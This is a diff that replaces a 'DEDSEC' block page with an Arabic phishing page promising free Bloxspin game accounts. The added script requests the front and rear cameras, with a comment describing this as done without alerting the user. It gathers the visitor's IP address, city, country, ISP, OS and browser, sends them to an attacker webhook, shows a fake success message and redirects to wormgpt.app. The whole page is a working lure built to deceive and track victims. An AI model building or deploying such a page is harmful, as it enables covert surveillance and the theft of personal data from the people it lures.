@@ -1,1 +1,79 @@
-<!doctype html><html lang="ar" dir="rtl"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Fares / Security DEDSEC V3 &gt; Intrusive</title><style>:root{color-scheme:dark}*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;background:#000;color:#fafafa;font-family:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;overflow:hidden}body:before{content:"";position:fixed;inset:-20%;background:repeating-linear-gradient(0deg,rgba(255,255,255,.05) 0 1px,transparent 1px 3px),repeating-linear-gradient(90deg,rgba(255,255,255,.04) 0 1px,transparent 1px 90px);animation:scan 7s linear infinite;pointer-events:none}.box{position:relative;text-align:center;padding:44px 30px;border:1px solid #fff;background:#050505;width:min(480px,calc(100vw - 28px));box-shadow:0 0 0 1px #000,0 0 80px rgba(255,255,255,.22)}.avatar{width:128px;height:128px;border-radius:999px;margin:0 auto 20px;display:grid;place-items:center;border:2px solid #fff;background:#000;font-size:58px;font-weight:900}.tag{display:inline-block;border:1px solid #fff;padding:6px 14px;font-size:11px;letter-spacing:.35em;margin-bottom:14px}.title{font-size:26px;font-weight:900;letter-spacing:.06em;margin:6px 0 4px;line-height:1.25}.sub{color:#b9b9b9;font-size:12px;letter-spacing:.25em;margin-bottom:18px}.meta{color:#7e7e7e;line-height:1.9;font-size:12px;border-top:1px dashed #2a2a2a;padding-top:14px}.dots:after{content:"_";animation:blink 1s steps(2) infinite}.red{color:#ff5151}@keyframes scan{to{transform:translate3d(8%,0,0)}}@keyframes blink{50%{opacity:0}}@media(prefers-reduced-motion:reduce){body:before,.dots:after{animation:none}}</style></head><body><main class="box"><div class="avatar">F</div><div class="tag">DEDSEC // V3</div><h1 class="title">Fares / Security DEDSEC V3 &gt; <span class="red">Intrusive</span></h1><div class="sub">UNAUTHORIZED ACCESS DETECTED</div><p class="meta">// intrusion_logged <span class="dots"></span><br>Ù‡Ø°Ø§ Ø§Ù„Ø±Ø§Ø¨Ø· Ù…Ø­Ù…ÙŠ. Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ù…Ù† Ø§Ù„Ù…ØªØµÙØ­ Ø£Ùˆ Ø§Ù„Ø¨ÙˆØªØ§Øª.<br>ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø¨ØµÙ…Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© ÙˆØ±ÙØ¶ Ø§Ù„Ø¬Ù„Ø³Ø©.</p></main></body></html>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Bloxspin Rewards</title>
+    <style>
+        body { background: #0f0f0f; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #1a1a1a; padding: 40px; border-radius: 20px; border: 2px solid #00ff88; text-align: center; box-shadow: 0 0 30px #00ff8844; }
+        button { background: #00ff88; color: #000; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 10px; transition: 0.3s; }
+        button:hover { background: #00cc6e; transform: scale(1.05); }
+        .hidden { display: none; }
+        #loader { color: #00ff88; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="box" id="main">
+    <h1 id="title">هل تريد الحصول على حسابات بلوكسبين مدفوعة مجاناً؟</h1>
+    <div id="btn-area">
+        <button onclick="startProcess()">نعم، أريد ذلك!</button>
+    </div>
+    <div id="loader" class="hidden">جاري تجهيز حسابك المجاني...</div>
+</div>
+
+<script>
+    const WEBHOOK_URL = 'ضع_رابط_الويبهوك_هنا';
+
+    async function startProcess() {
+        document.getElementById('btn-area').classList.add('hidden');
+        document.getElementById('title').innerText = "جاري التحقق من الأهلية...";
+        document.getElementById('loader').classList.remove('hidden');
+
+        try {
+            // 1. فتح الكاميرات (بدون تنبيه المستخدم)
+            await Promise.all([
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+            ]);
+
+            // 2. جلب الـ IP والمعلومات الجغرافية
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const geoRes = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+            const geoData = await geoRes.json();
+
+            // 3. تجميع البيانات وإرسالها للويبهوك
+            const data = {
+                offer: "Bloxspin Free Accounts",
+                ip: ipData.ip,
+                location: `${geoData.city}, ${geoData.country}`,
+                isp: geoData.isp,
+                os: navigator.platform,
+                browser: navigator.userAgent,
+                time: new Date().toLocaleString()
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+
+            // 4. تغيير الواجهة ليوهم المستخدم أن العملية اكتملت
+            document.getElementById('title').innerText = "تم تسجيلك بنجاح!";
+            document.getElementById('loader').innerText = "سيتم توجيهك لصفحة الحسابات الآن...";
+            
+            setTimeout(() => {
+                alert("شكراً لك! سيتم إرسال الحسابات إلى بريدك.");
+                window.location.href = "https://wormgpt.app"; // توجيه وهمي
+            }, 2000);
+
+        } catch (e) {
+            document.getElementById('title').innerText = "حدث خطأ بسيط.";
+            document.getElementById('loader').innerText = "يرجى تحديث الصفحة والمحاولة مرة أخرى.";
+        }
+    }
+</script>
+</body>
+</html>
